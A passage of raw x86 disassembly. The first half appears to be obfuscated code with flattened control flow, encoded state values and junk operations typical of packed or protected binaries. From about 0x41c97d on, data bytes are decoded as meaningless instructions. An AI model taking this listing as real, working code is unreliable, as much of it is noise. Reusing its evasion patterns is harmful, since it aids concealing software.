  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x4234ce
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x4235dd
  41c68d:	push   0x4235f4
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42175a
  41c725:	mov    ecx,DWORD PTR ds:0x4234ba
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0x6080d858
  41c98a:	push   ecx
  41c98b:	mov    ds:0x61fde173,eax
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx+0x50]
  41c996:	mov    al,ds:0xbc3ea021
  41c99b:	xchg   DWORD PTR [edi],ebp
  41c99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c99e:	outs   dx,BYTE PTR ds:[esi]
  41c99f:	aam    0xb0
  41c9a1:	mov    esp,DWORD PTR [eax+0x29]
  41c9a4:	pop    esp
  41c9a5:	pusha  
  41c9a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a7:	dec    edx
  41c9a8:	lahf   
  41c9a9:	inc    edx
  41c9aa:	outs   dx,BYTE PTR ds:[esi]
  41c9ab:	bswap  ecx
  41c9ad:	mov    ds:0x512e9768,eax
  41c9b2:	cmp    ah,al
  41c9b4:	adc    ebp,ebp
  41c9b6:	test   ch,0x55
  41c9b9:	xor    eax,0x4c71031d
  41c9be:	out    0xb9,al
  41c9c0:	js     0x41ca06
  41c9c2:	push   edi
  41c9c3:	push   ebx
  41c9c4:	add    ebp,DWORD PTR [ecx+0x63aff7f6]
  41c9ca:	das    
  41c9cb:	cs fs cli 
  41c9ce:	or     BYTE PTR [esi+0x29],dh
  41c9d1:	mov    edx,0x82908482
  41c9d6:	mov    edi,0x9d90fa0b
  41c9db:	test   BYTE PTR [ecx+edx*4],dl
  41c9de:	retf   
  41c9df:	and    al,0x61
  41c9e1:	inc    ecx
  41c9e2:	xor    ah,BYTE PTR [ebp+0x5b78f2c9]
  41c9e8:	and    al,0x93
  41c9ea:	mov    bl,0xf0
  41c9ec:	(bad)  [eax-0x41]
  41c9ef:	mov    al,0x1f
  41c9f1:	adc    eax,0xb3f972c6
  41c9f6:	adc    eax,0xefc6002b
  41c9fb:	inc    eax
  41c9fc:	or     eax,0x1903287f
  41ca01:	rcr    BYTE PTR [esp+ebp*4-0x249304c2],1
  41ca08:	fdiv   QWORD PTR [ebx]
  41ca0a:	lods   al,BYTE PTR ds:[esi]
  41ca0b:	outs   dx,BYTE PTR ds:[esi]
  41ca0c:	icebp  
  41ca0d:	loop   0x41ca58
  41ca0f:	js     0x41c998
  41ca11:	shr    DWORD PTR [edx-0x461cd538],1
  41ca17:	fdivr  QWORD PTR [edx-0x7b]
  41ca1a:	data16 jl 0x41ca3b
  41ca1d:	jge    0x41c9dc
  41ca1f:	ja     0x41c9ab
  41ca21:	fwait
  41ca22:	and    BYTE PTR ss:[eax-0x52d194d1],ch
  41ca29:	xchg   edi,eax
  41ca2a:	lods   eax,DWORD PTR ds:[esi]
  41ca2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca2c:	sub    ecx,esi
  41ca2e:	cmp    edi,edi
  41ca30:	mov    dl,0x3d
  41ca32:	fcmovnbe st,st(0)
  41ca34:	mov    al,0x3a
  41ca36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca37:	icebp  
  41ca38:	rcl    DWORD PTR [edi+0x1b23e81c],cl
  41ca3e:	or     eax,0x3b940de0
  41ca43:	out    0x9c,al
  41ca45:	push   edi
  41ca46:	js     0x41cab2
  41ca48:	stc    
  41ca49:	mov    eax,ds:0x1e59f0d1
  41ca4e:	pop    ss
  41ca4f:	sbb    BYTE PTR [ebx+0x563196a9],dh
  41ca55:	dec    ebp
  41ca56:	lahf   
  41ca57:	lods   eax,DWORD PTR ds:[esi]
  41ca58:	add    al,BYTE PTR [ebp-0x549d3b3]
  41ca5e:	clc    
  41ca5f:	jecxz  0x41ca34
  41ca61:	mov    esi,0xb52e76f8
  41ca66:	je     0x41cadc
  41ca68:	jecxz  0x41c9fe
  41ca6a:	aad    0xd9
  41ca6c:	cwde   
  41ca6d:	mul    DWORD PTR [ebx]
  41ca6f:	out    dx,al
  41ca70:	ret    0x463
  41ca73:	rol    BYTE PTR [ebx],0x53
  41ca76:	(bad)  
  41ca77:	and    dl,cl
  41ca79:	xor    ch,dh
  41ca7b:	inc    edi
  41ca7c:	imul   ecx,DWORD PTR [ecx+edi*1-0x7e],0x8ebb7402
  41ca84:	jmp    0x45bb89d9
  41ca89:	sub    eax,0x39c6b8c0
  41ca8e:	push   ebx
  41ca8f:	clc    
  41ca90:	(bad)  
  41ca92:	xchg   esi,eax
  41ca93:	adc    al,0xc9
  41ca95:	xchg   edx,eax
  41ca96:	xchg   ebp,eax
  41ca97:	xor    ecx,DWORD PTR [edx+0x1428bd13]
  41ca9d:	add    al,0x52
  41ca9f:	rcl    BYTE PTR [esp+ebx*2],cl
  41caa2:	dec    esp
  41caa3:	ret    0x73ad
  41caa6:	dec    ecx
  41caa7:	jge    0x41ca8d
  41caa9:	frstor [eax+0x7e]
  41caac:	mov    WORD PTR [edi-0x10],fs
  41caaf:	dec    ebx
  41cab0:	out    dx,al
  41cab1:	adc    DWORD PTR [esi+0x65],eax
  41cab4:	data16 mov ah,0x6a
  41cab7:	jne    0x41cb30
  41cab9:	mov    eax,0x4db8393f
  41cabe:	jl     0x41cac3
  41cac0:	ja     0x41cab3
  41cac2:	xchg   ebp,eax
  41cac3:	sub    eax,0xf08a0e7f
  41cac8:	adc    cl,BYTE PTR [edi]
  41caca:	add    DWORD PTR [ebp-0x2657005d],esi
  41cad0:	nop
  41cad1:	add    ecx,esp
  41cad3:	hlt    
  41cad4:	sbb    BYTE PTR [ebp-0x56a2d484],0x42
  41cadb:	pop    edx
  41cadc:	pop    ds
  41cadd:	ret    0xdefb
  41cae0:	xchg   esi,eax
  41cae1:	pop    ebp
  41cae2:	adc    DWORD PTR [edi+0x2b],0x9e108a33
  41cae9:	pop    ss
  41caea:	jne    0x41ca84
  41caec:	pop    ecx
  41caed:	enter  0x957a,0x4b
  41caf1:	mov    ds:0xe7109757,al
  41caf6:	push   eax
  41caf7:	das    
  41caf8:	inc    ebp
  41caf9:	xor    DWORD PTR [edx+ebp*8+0x5355ac89],esi
  41cb00:	inc    DWORD PTR [ecx-0x4ecc8fe3]
  41cb06:	mov    al,ds:0x4d217ca7
  41cb0b:	pop    ecx
  41cb0c:	inc    ebx
  41cb0d:	and    DWORD PTR ss:[edi-0x7c9f24ad],0x5cd53bec
  41cb18:	adc    edx,0x7d
  41cb1b:	enter  0x9f11,0x39
  41cb1f:	fistp  QWORD PTR [ecx+0x5542e60c]
  41cb25:	mov    BYTE PTR [ebx+0x4fa0825b],cl
  41cb2b:	and    bl,cl
  41cb2d:	fwait
  41cb2e:	cld    
  41cb2f:	adc    eax,0xbdbc61e8
  41cb34:	mov    al,0x57
  41cb36:	lock jmp 0xbd59:0x9e1e0f4a
  41cb3e:	loop   0x41cae2
  41cb40:	add    ebx,0xffffffd2
  41cb43:	push   esp
  41cb44:	data16 cmp al,0xed
  41cb47:	imul   esi,DWORD PTR [ebx],0x21
  41cb4a:	loope  0x41cb1d
  41cb4c:	mov    esi,0xf7a808a7
  41cb51:	lock loopne 0x41cb6d
  41cb54:	lea    ebx,ds:0x4b6d9402
  41cb5a:	cli    
  41cb5b:	in     eax,dx
  41cb5c:	mov    edi,DWORD PTR [ebp+0x35]
  41cb5f:	add    dh,dl
  41cb61:	mov    esi,0x6b4f7a9f
  41cb66:	mov    esp,0x2109a82e
  41cb6b:	add    dh,BYTE PTR [ebx+0x754744a0]
  41cb71:	mov    ah,0x42
  41cb73:	call   0x542e:0x5f4b6246
  41cb7a:	not    ch
  41cb7c:	mov    dl,0xb4
  41cb7e:	outs   dx,DWORD PTR ds:[esi]
  41cb80:	sahf   
  41cb81:	pusha  
  41cb82:	sbb    edx,DWORD PTR [esi-0x67]
  41cb85:	push   edx
  41cb86:	enter  0x9d8,0xad
  41cb8a:	or     al,0x2b
  41cb8c:	js     0x41cbbd
  41cb8e:	out    dx,al
  41cb8f:	in     al,0x8c
  41cb91:	jmp    0x87ea3446
  41cb96:	adc    BYTE PTR [esi-0x76],bl
  41cb99:	sbb    ch,BYTE PTR [esp+ecx*1-0x5e]
  41cb9d:	cwde   
  41cb9e:	sbb    dl,dh
  41cba0:	dec    esi
  41cba1:	out    0xa5,al
  41cba3:	retf   0xccd6
  41cba6:	popa   
  41cba7:	ja     0x41cc25
  41cba9:	leave  
  41cbaa:	mov    ah,0xc6
  41cbac:	adc    eax,ebx
  41cbae:	imul   ebp,DWORD PTR [ebp+0x17112cb6],0x67c64fe
  41cbb8:	adc    DWORD PTR [ecx-0x54ed047],esp
  41cbbe:	cdq    
  41cbbf:	clc    
  41cbc0:	jae    0x41cb9e
  41cbc2:	cmc    
  41cbc3:	repnz ins BYTE PTR es:[edi],dx
  41cbc5:	lock jo 0x41cc31
  41cbc8:	imul   ecx,DWORD PTR [ebx],0x56
  41cbcb:	fisub  WORD PTR [edx-0x3c8d64d5]
  41cbd1:	pop    es
  41cbd2:	push   ebx
  41cbd3:	adc    cl,cl
  41cbd5:	icebp  
  41cbd6:	adc    cl,ch
  41cbd8:	aas    
  41cbd9:	sub    ch,BYTE PTR [esi]
  41cbdb:	inc    edi
  41cbdc:	inc    esi
  41cbdd:	xor    al,0xe1
  41cbdf:	mov    esp,0x83617abf
  41cbe4:	(bad)  
  41cbe5:	pop    ebx
  41cbe6:	and    dl,BYTE PTR [ecx-0x595b614]
  41cbec:	mov    eax,0xb9145026
  41cbf1:	fwait
  41cbf2:	dec    edi
  41cbf3:	popf   
  41cbf4:	repz mov al,0x13
  41cbf7:	and    ebx,ebx
  41cbf9:	rcr    DWORD PTR [esp+ebp*4],0x33
  41cbfd:	pop    esi
  41cbfe:	(bad)  
  41cbff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc00:	fs loopne 0x41cb8a
  41cc03:	pop    edx
  41cc04:	(bad)  [edx+0x63966033]
  41cc0a:	dec    edi
  41cc0b:	dec    edx
  41cc0c:	outs   dx,BYTE PTR ds:[esi]
  41cc0d:	push   es
  41cc0e:	shufps xmm4,XMMWORD PTR [edi-0x67f64a00],0xdd
  41cc16:	sub    eax,0xb0dad646
  41cc1b:	adc    al,0xd8
  41cc1d:	jns    0x41cc36
  41cc1f:	inc    ecx
  41cc20:	pop    ds
  41cc21:	xchg   esi,eax
  41cc22:	push   ss
  41cc23:	popa   
  41cc24:	mov    bl,0xa3
  41cc26:	fistp  QWORD PTR [esi-0x42aaa1cb]
  41cc2c:	sahf   
  41cc2d:	pop    esi
  41cc2e:	clc    
  41cc2f:	(bad)  [edx+0x114d8e4e]
  41cc35:	mov    eax,0xae701cbb
  41cc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc3b:	ss ins BYTE PTR es:[edi],dx
  41cc3d:	syscall 
  41cc3f:	dec    eax
  41cc40:	inc    esi
  41cc41:	dec    esi
  41cc42:	xchg   ebp,eax
  41cc43:	enter  0x8bc4,0x1c
  41cc47:	mov    ebx,0x17a59479
  41cc4c:	out    0x79,eax
  41cc4e:	ret    
  41cc4f:	in     al,dx
  41cc50:	jge    0x41cc13
  41cc52:	push   eax
  41cc53:	xor    esi,DWORD PTR [edx]
  41cc55:	add    al,0xa4
  41cc57:	add    bh,al
  41cc59:	repz cmp al,0x44
  41cc5c:	push   eax
  41cc5d:	imul   ebp,DWORD PTR [eax],0x3dbfef8
  41cc63:	cs je  0x41cce0
  41cc66:	lods   al,BYTE PTR ds:[esi]
  41cc67:	adc    al,0x63
  41cc69:	pushf  
  41cc6a:	aam    0xd2
  41cc6c:	out    dx,eax
  41cc6d:	repz aad 0xd6
  41cc70:	dec    ecx
  41cc71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc72:	gs xchg ebp,eax
  41cc74:	iret   
  41cc75:	dec    edi
  41cc76:	mov    cl,0x34
  41cc78:	xchg   ecx,eax
  41cc79:	mov    ebx,0x70c53e4f
  41cc7e:	jbe    0x41cca3
  41cc80:	pop    es
  41cc81:	cwde   
  41cc82:	popa   
  41cc83:	test   al,0xc3
  41cc85:	std    
  41cc86:	js     0x41cc0d
  41cc88:	cmp    al,0x43
  41cc8a:	xor    eax,0x4a60cd32
  41cc8f:	jbe    0x41cc31
  41cc91:	jbe    0x41cc40
  41cc93:	push   esi
  41cc94:	retf   0x22db
  41cc97:	repnz xor al,0x8
  41cc9a:	push   DWORD PTR [ebp+0x53]
  41cc9d:	out    0x3d,eax
  41cc9f:	and    DWORD PTR [ecx],ecx
  41cca1:	jbe    0x41cd16
  41cca3:	retf   
  41cca4:	mov    ds:0x4892b547,al
  41cca9:	xchg   DWORD PTR [esi-0x7f],esp
  41ccac:	cmc    
  41ccad:	cmp    bl,ah
  41ccaf:	(bad)  
  41ccb0:	xchg   ebx,eax
  41ccb1:	ds mov ch,0xd6
  41ccb4:	push   bx
  41ccb6:	(bad)  
  41ccb7:	ret    0xebda
  41ccba:	fisttp WORD PTR [edi-0x18e35b1]
  41ccc0:	outs   dx,DWORD PTR ds:[esi]
  41ccc1:	jecxz  0x41ccf3
  41ccc3:	adc    DWORD PTR [eax-0x4dff3046],0x8cee7584
  41cccd:	mov    eax,ds:0x73024f92
  41ccd2:	dec    esi
  41ccd3:	pop    edi
  41ccd4:	dec    ebx
  41ccd5:	mov    bh,0x40
  41ccd7:	pop    eax
  41ccd8:	xchg   ecx,eax
  41ccd9:	test   al,0xc7
  41ccdb:	mov    bh,0x3b
  41ccdd:	popa   
  41ccde:	add    al,0x28
  41cce0:	scas   eax,DWORD PTR es:[edi]
  41cce1:	push   edi
  41cce2:	aam    0x9b
  41cce4:	mov    bl,0x4b
  41cce6:	xchg   ecx,eax
  41cce7:	cmp    eax,0x82e0f10a
  41ccec:	xchg   edx,eax
  41cced:	sub    DWORD PTR [esi-0xc5a5f6],edx
  41ccf3:	mov    dl,0xc
  41ccf5:	sbb    BYTE PTR [ebx-0x63afdaf1],al
  41ccfb:	adc    eax,0xa98a4efe
  41cd00:	push   ecx
  41cd01:	test   DWORD PTR [esi],esp
  41cd03:	sar    ah,0xff
  41cd06:	xchg   BYTE PTR [ebx-0x164f00c5],dh
  41cd0c:	sub    eax,0x1d7beff2
  41cd11:	loope  0x41ccb9
  41cd13:	push   0x7fe3570f
  41cd18:	ffreep st(3)
  41cd1a:	adc    al,0x79
  41cd1c:	ret    0xd350
  41cd1f:	push   esp
  41cd20:	rcr    BYTE PTR [esi],0x55
  41cd23:	in     eax,dx
  41cd24:	sub    eax,0xd0d81f21
  41cd29:	cmp    BYTE PTR [ecx-0x15e94b90],bl
  41cd2f:	push   cs
  41cd30:	and    al,0x37
  41cd32:	mov    ds:0x2fad731f,al
  41cd37:	aas    
  41cd38:	adc    BYTE PTR [edx-0x156dbc45],ch
  41cd3e:	scas   eax,DWORD PTR es:[edi]
  41cd3f:	push   es
  41cd40:	int3   
  41cd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd42:	mov    esi,0xe2bb6c70
  41cd47:	cmp    esi,edi
  41cd49:	sbb    bh,BYTE PTR [esi+0x37]
  41cd4c:	cld    
  41cd4d:	out    dx,eax
  41cd4e:	push   ecx
  41cd4f:	dec    eax
